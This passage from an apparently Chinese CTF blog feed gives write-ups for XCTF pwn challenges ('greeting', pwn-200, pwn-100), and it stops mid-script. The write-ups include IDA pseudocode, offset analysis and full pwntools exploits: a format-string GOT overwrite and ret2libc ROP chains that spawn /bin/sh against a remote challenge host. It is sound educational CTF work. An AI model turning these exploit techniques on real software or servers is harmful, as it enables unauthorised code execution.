punctuation">(</span>低地址<span class="token punctuation">)</span>     <span class="token function">0x11</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>小端模式存储（存储地址为<span class="token number">16</span>位）地址                    数据<span class="token function">0x0004</span><span class="token punctuation">(</span>高地址<span class="token punctuation">)</span>     <span class="token number">0x11</span><span class="token number">0x0003</span>                 <span class="token number">0x22</span><span class="token number">0x0002</span>                 <span class="token number">0x33</span><span class="token function">0x0001</span><span class="token punctuation">(</span>低地址<span class="token punctuation">)</span>     <span class="token number">0x44</span></code></pre><p>差点忘了测偏移量了~~</p><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge$ <span class="token punctuation">.</span>/greeting Hello<span class="token punctuation">,</span> I'm nao<span class="token operator">!</span>Please tell me your name<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> AABB<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%pNice to meet you<span class="token punctuation">,</span> AABB<span class="token punctuation">.</span><span class="token number">0x80487d0</span><span class="token punctuation">.</span><span class="token number">0xff91489c</span><span class="token punctuation">.</span><span class="token punctuation">(</span>nil<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>nil<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>nil<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>nil<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token number">0x6563694e</span><span class="token punctuation">.</span><span class="token number">0x206f7420</span><span class="token punctuation">.</span><span class="token number">0x7465656d</span><span class="token punctuation">.</span><span class="token number">0x756f7920</span><span class="token punctuation">.</span><span class="token number">0x4141202c</span><span class="token punctuation">.</span><span class="token number">0x252e4242</span><span class="token punctuation">.</span><span class="token number">0x70252e70</span><span class="token punctuation">.</span><span class="token number">0x2e70252e</span><span class="token punctuation">.</span><span class="token number">0x252e7025</span> <span class="token operator">:</span><span class="token punctuation">)</span></code></pre><p>AA的ASCII的偏移为11，BB的ASCII的偏移为12，两者分开了，应该存入时栈没有对齐。<br>也可以在IDA伪码中算出偏移：<br>因为printf的s===&gt;esp+0x1c.   sprintf(&amp;s, “Nice to meet you, %s :)\n”, &amp;v5)；函数使得我们的输入（v5）距离s为18.所以0x1c-0x4+18==42  42/4 = 10.2这也是为啥上面AABB分开的原因，我们可以先用两个padding对齐，然后在存入关键数据。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./greeting'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = remote('220.249.52.133',41988)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>fini_array <span class="token operator">=</span> <span class="token number">0x08049934</span>system_plt <span class="token operator">=</span> <span class="token number">0x08048490</span>strlen_got <span class="token operator">=</span> <span class="token number">0x08049A54</span>start <span class="token operator">=</span>      <span class="token number">0x080484F0</span> payload <span class="token operator">=</span> <span class="token string">'AA'</span>   <span class="token comment" spellcheck="true">#用来对齐的padding</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>strlen_got<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#12   //从低地址覆盖到高地址，两个字节。覆盖量：0x0804</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>strlen_got<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#13    //覆盖量：0x8490</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>fini_array<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#14  //覆盖量：0x84F0 </span>payload <span class="token operator">+=</span> <span class="token string">'%2020c%12$hn%31884c%13$hn%96c%14$hn'</span>    <span class="token comment" spellcheck="true">#用hn就是让printf函数向目标地址最多写满两个字节，还有别忘了前面的输出也算上</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>                                      <span class="token comment" spellcheck="true">##补充，%hhn写1字节，%lln写8字节。</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果</p><pre class=" language-java"><code class="language-java">Hello<span class="token punctuation">,</span> I'm nao<span class="token operator">!</span>Please tell me your name<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> $ <span class="token operator">/</span>bin<span class="token operator">/</span>sh<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x8</span> bytes<span class="token operator">:</span>    <span class="token string">'/bin/sh\n'</span>$ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'hunter\n'</span>hunter$  </code></pre><h2 id="MASS"><a href="#MASS" class="headerlink" title="MASS"></a>MASS</h2><p>为啥不用fmt漏洞覆盖plt表，而时偏要覆盖got表？<br>因为plt存放的时指令，got表才是存放地址。比如把plt这里的jmp数据给覆盖成目标地址，那也没法跳转啊</p><pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> x<span class="token operator">/</span>10i <span class="token number">0x80484c0</span>   <span class="token number">0x80484c0</span> <span class="token operator">&lt;</span>strlen<span class="token annotation punctuation">@plt</span><span class="token operator">></span><span class="token operator">:</span>    jmp    DWORD PTR ds<span class="token operator">:</span><span class="token number">0x8049a54</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>got表   <span class="token number">0x80484c6</span> <span class="token operator">&lt;</span>strlen<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">6</span><span class="token operator">></span><span class="token operator">:</span>    push   <span class="token number">0x40</span>   <span class="token number">0x80484cb</span> <span class="token operator">&lt;</span>strlen<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">11</span><span class="token operator">></span><span class="token operator">:</span>    jmp    <span class="token number">0x8048430</span>第一次执行strlen以后，这里就是存放真实地址，而且有plt来帮忙跳转，把这里的地址覆盖了岂不美哉（doge）pwndbg<span class="token operator">></span> x<span class="token operator">/</span>10x <span class="token number">0x8049a54</span><span class="token number">0x8049a54</span> <span class="token operator">&lt;</span>strlen<span class="token annotation punctuation">@got</span><span class="token punctuation">.</span>plt<span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0xf7dea900</span>    <span class="token number">0xf7d7dd90</span>    <span class="token number">0x080484e6</span>    <span class="token number">0x00000000</span><span class="token number">0x8049a64</span><span class="token operator">:</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span></code></pre><p>在这个got表存放了system_plt后就会跳到system_plt去执行。应该换成system_got也没问题。</p><p>参考资料：<a href="https://www.hacksec.cn/Penetration-test/1137.html" target="_blank" rel="noopener">https://www.hacksec.cn/Penetration-test/1137.html</a><br><a href="https://bbs.ichunqiu.com/thread-43624-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-43624-1-1.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CFT-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-CHALLENGE-PWN-200</title>
      <link href="/2020/09/02/xctf-challenge-pwn-200/"/>
      <url>/2020/09/02/xctf-challenge-pwn-200/</url>
      
        <content type="html"><![CDATA[<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge$ checksec pwn<span class="token operator">-</span><span class="token number">200</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/pwn-200'</span>    Arch<span class="token operator">:</span>     i386<span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Partial RELRO    Stack<span class="token operator">:</span>    No canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x8048000</span><span class="token punctuation">)</span>基操</code></pre><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+2Ch] [ebp-6Ch]</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+30h] [ebp-68h]</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+34h] [ebp-64h]</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+38h] [ebp-60h]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+3Ch] [ebp-5Ch]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+40h] [ebp-58h]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+44h] [ebp-54h]</span>  buf <span class="token operator">=</span> <span class="token string">'cleW'</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//小端序</span>  v2 <span class="token operator">=</span> <span class="token string">' emo'</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token string">'X ot'</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token string">'FTCD'</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token string">'5102'</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token string">'\n!~'</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v7<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">76u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//输出 提示语</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_8048484</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>vulnerable：ssize_t <span class="token function">sub_8048484</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-6Ch]</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//栈溢出漏洞</span><span class="token punctuation">}</span></code></pre><h3 id="可用字符"><a href="#可用字符" class="headerlink" title="可用字符"></a>可用字符</h3><pre class=" language-java"><code class="language-java">LOAD<span class="token operator">:</span><span class="token number">08048154</span>    <span class="token number">00000013</span>    C    <span class="token operator">/</span>lib<span class="token operator">/</span>ld<span class="token operator">-</span>linux<span class="token punctuation">.</span>so<span class="token number">.2</span>LOAD<span class="token operator">:</span><span class="token number">08048269</span>    <span class="token number">0000000F</span>    C    __gmon_start__LOAD<span class="token operator">:</span><span class="token number">08048278</span>    0000000A    C    libc<span class="token punctuation">.</span>so<span class="token number">.6</span>LOAD<span class="token operator">:</span><span class="token number">08048282</span>    <span class="token number">0000000F</span>    C    _IO_stdin_usedLOAD<span class="token operator">:</span><span class="token number">08048291</span>    <span class="token number">00000006</span>    C    stdinLOAD<span class="token operator">:</span><span class="token number">08048297</span>    <span class="token number">00000005</span>    C    readLOAD<span class="token operator">:</span>0804829C    <span class="token number">00000007</span>    C    stdoutLOAD<span class="token operator">:</span>080482A3    <span class="token number">00000007</span>    C    setbufLOAD<span class="token operator">:</span>080482AA    <span class="token number">00000012</span>    C    __libc_start_mainLOAD<span class="token operator">:</span>080482BC    <span class="token number">00000006</span>    C    writeLOAD<span class="token operator">:</span>080482C2    0000000A    C    GLIBC_2<span class="token number">.0</span><span class="token punctuation">.</span>eh_frame<span class="token operator">:</span>080486B3    <span class="token number">00000005</span>    C    <span class="token punctuation">;</span><span class="token operator">*</span><span class="token number">2</span>$\"</code></pre><p>没有system , /bin/sh , 后门</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>第一次攻击<ul><li>栈溢出控制程序流程</li><li>构造write函数泄露某函数真实地址</li><li>返回到start</li></ul></li><li>第二次攻击<ul><li>利用泄露的真实地址得到libc版本</li><li>获取libc地址，system，/bin/sh</li><li>栈溢出，构造system函数</li></ul></li></ul><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'pwn-200'</span><span class="token punctuation">)</span>start <span class="token operator">=</span> <span class="token number">0x080483D0</span>write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#sh = process('./pwn-200')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'220.249.52.133'</span><span class="token punctuation">,</span><span class="token number">55272</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>offset <span class="token operator">=</span> <span class="token number">112</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span>offsetpayload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>start<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>write_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">,</span>write_addr<span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> write_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_addr<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>bin_sh_addr <span class="token operator">=</span> libc_addr<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>rop <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span>offsetrop <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>rop <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rop<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-java"><code class="language-java">Welcome to XDCTF2015<span class="token operator">~</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> ubuntu<span class="token operator">-</span>xenial<span class="token operator">-</span>amd64<span class="token operator">-</span>libc6<span class="token operator">-</span><span class="token function">i386</span> <span class="token punctuation">(</span>id libc6<span class="token operator">-</span>i386_2<span class="token number">.23</span><span class="token operator">-</span>0ubuntu10_amd64<span class="token punctuation">)</span> be choosed<span class="token punctuation">.</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7d</span> bytes<span class="token operator">:</span>    <span class="token number">00000000</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  │AAAA│AAAA│AAAA│AAAA│    <span class="token operator">*</span>    <span class="token number">00000070</span>  <span class="token number">40</span> b9 <span class="token number">59</span> f7  ef be ad de  2b a0 6b f7  0a           │@·Y·│····│<span class="token operator">+</span>·k·│·│    <span class="token number">0000007d</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode$ ls</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-CHALLENGE-PWN-100</title>
      <link href="/2020/09/01/xctf-challenge-pwn-100/"/>
      <url>/2020/09/01/xctf-challenge-pwn-100/</url>
      
        <content type="html"><![CDATA[<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-python"><code class="language-python">hunter@hunter<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge$ checksec pwn<span class="token number">-100</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/pwn-100'</span>    Arch<span class="token punctuation">:</span>     amd64<span class="token number">-64</span><span class="token operator">-</span>little    RELRO<span class="token punctuation">:</span>    Partial RELRO    Stack<span class="token punctuation">:</span>    No canary found    NX<span class="token punctuation">:</span>       NX enabled    PIE<span class="token punctuation">:</span>      No PIE <span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span>基操</code></pre><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><pre class=" language-c"><code class="language-c">main：__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_40068E</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">sub_40068E</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-40h]</span>  <span class="token function">sub_40063D</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// read（0，&amp;v1，200）</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"bye~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>__int64 __fastcall <span class="token function">sub_40063D</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-4h]</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    result <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">>=</span> a2 <span class="token punctuation">)</span>              <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>关键函数在于sub_40063D，功能和read函数一样read（0，&amp;v1，200），但这里强制读满200个字符</strong></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>sub_40068E函数中的sub_40063D实现了read函数的功能，可以控制程序流程</li><li>没有system，/bin/sh，更没有后门</li><li>用puts函数泄露真实地址，获取libc版本，从而获取system，/bin/sh</li><li>所以进行两次攻击</li></ul><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn-100'</span><span class="token punctuation">)</span>libc_start_main_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400763</span>start_addr <span class="token operator">=</span> <span class="token number">0x000400550</span><span class="token comment" spellcheck="true">#sh = process('./pwn-100')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'220.249.52.133'</span><span class="token punctuation">,</span><span class="token number">54326</span><span class="token punctuation">)</span>ret <span class="token operator">=</span> <span class="token number">0x00000000004004e1</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x40</span> payload <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">8</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'bye~\n'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#puts_addr = u64(sh.recv(6)+'\x00'*2)</span>st_r <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">//</span>去除后面的\n<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>st_r<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token operator">//</span>填满八个字节    st_r <span class="token operator">+=</span> <span class="token string">'\x00'</span><span class="token comment" spellcheck="true">#libc_start_main_addr = u64(sh.recv(6)+'\x00'*2)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>st_r<span class="token punctuation">)</span><span class="token keyword">print</span> str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> puts_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>bin_sh_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token 